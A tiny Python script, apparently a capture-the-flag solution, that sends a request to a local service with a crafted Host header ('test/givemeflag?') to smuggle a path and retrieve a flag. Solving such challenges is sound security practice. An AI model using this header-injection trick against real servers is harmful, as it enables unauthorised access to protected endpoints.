import requests

res = requests.get("http://localhost:3000/", headers={"Host": "test/givemeflag?"})
print(res.text)
